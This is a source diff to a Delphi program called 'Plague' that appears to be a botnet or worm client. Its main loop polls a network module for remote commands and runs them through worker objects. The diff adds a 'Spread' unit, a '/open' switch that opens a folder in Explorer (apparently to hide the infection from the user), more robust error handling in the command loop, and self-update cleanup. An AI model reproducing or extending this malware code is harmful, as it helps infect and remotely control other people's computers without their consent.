@@ -5,7 +5,7 @@ program Plague;
 uses
   Debug,
   NetModule, Tools,
-  Classes, Windows, SysUtils, CmdWorker;
+  Classes, Windows, SysUtils, CmdWorker, Spread;
 
 {$R *.res}
 
@@ -14,9 +14,11 @@ var
   CmdID, ToAbort: String;
 
 Begin
+  if ParamStr(1)='/open' then ShellExecute(0, 'open', 'explorer.exe',
+    PChar(ParamStr(2)), nil, SW_NORMAL);
   LoadSettings;
   Initialize;
-  if ParamStr(1)='/wait' then Sleep(2000);
+  if ParamStr(1)='/wait' then Sleep(Delay+200);
   if ParamStr(2)='/removeold' then
     if FileExists(ParamStr(0)+'.old') then DeleteFile(ParamStr(0)+'.old');
   ChDir(ExtractFileDir(ParamStr(0)));
@@ -24,6 +26,7 @@ Begin
 
   Net:=TNet.Create(Nil);
   Repeat
+    try
     Net.GetCommands;
     Log('Available commands: '+IntToStr(Net.CommandCount), White);
     For J:=1 to Net.CommandCount do Begin
@@ -49,5 +52,13 @@ Begin
     end;
     //Readln;
     Sleep(Delay);
-  until False;
+    except on E: Exception do Writeln('Fatal Exception: '+E.Message);
+    end;
+  until Not(AllowExecution);
+  For J:=1 to High(Workers) do
+  if Assigned(Workers[J]) then Begin
+    Workers[J].Destroy;
+  end;
+  SetLength(Workers, 0);
+  Net.Free;
 end.
